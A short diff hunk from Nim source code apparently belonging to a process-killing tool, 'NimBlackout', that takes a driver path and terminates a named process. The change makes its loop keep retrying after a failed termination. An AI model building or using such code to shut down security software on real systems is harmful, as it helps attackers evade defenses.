@@ -122,7 +122,7 @@ proc NimBlackout(process_name: string, driver_path: cstring): void=
         if result == false:
             echo "[-] Process failed to terminate"
             echo "[*] Windows error code: " & $GetLastError()
-            break
+            continue
         echo "[+] Process has been terminated !\n\\_ [*] Keep running if you want avoid restarting"
 
 
